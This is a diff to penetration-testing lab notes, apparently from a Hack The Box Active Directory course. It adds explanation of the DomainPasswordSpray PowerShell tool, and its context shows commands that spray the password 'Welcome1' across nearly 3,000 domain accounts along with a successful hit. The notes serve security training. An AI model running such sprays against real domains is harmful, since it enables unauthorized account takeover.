@@ -432,6 +432,11 @@ SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administ
 
 ## DomainPasswordSpray.ps1
 
+From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
+
+There are several options available to us with the tool. Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us.
+
+
 ```powershell
 PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
 PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
@@ -458,6 +463,7 @@ Are you sure you want to perform a password spray against 2923 accounts?
 [*] SUCCESS! User:tjohnson Password:Welcome1
 ```
 
+We could also utilize Kerbrute to perform the same user enumeration and spraying steps shown in the previous section.
 
 # Credentialed Enumeration (Linux)
 
